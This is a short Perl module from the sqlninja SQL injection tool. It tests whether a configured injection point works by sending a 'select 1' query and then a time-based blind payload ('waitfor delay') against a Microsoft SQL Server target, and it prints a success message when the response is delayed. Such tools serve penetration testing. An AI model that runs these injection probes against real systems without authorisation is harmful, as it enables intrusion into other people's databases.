# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

# Simply test whether the configuration is correct and the injection
# is working

use strict;

our $conf;

sub test
{
	print "[+] Checking that server is responding...\n";
	my $query = "select 1;";
	my $delay = tryblind($query);
	if ($delay > 10) {
		print "[-] Server took more than 10 seconds... something is probably wrong. Exiting\n";
		exit(-1);
	}
	print "[+] Server responded in $delay seconds\n";

	print "[+] Trying to inject a 'waitfor delay'....\n";
	$query = "waitfor delay '0:0:".$conf->{'blindtime'}."';";
	$delay = tryblind($query);
	if ($delay > ($conf->{'blindtime'} - 2)) {
		print "[+] Injection was successful! Let's rock !! :)\n"
	} else {
		print "[-] Injection was not successful. Possible causes:\n"; 
		print "    1. The application is not vulnerable\n";
		print "    2. There is an error in the configuration\n";
	}
}

1;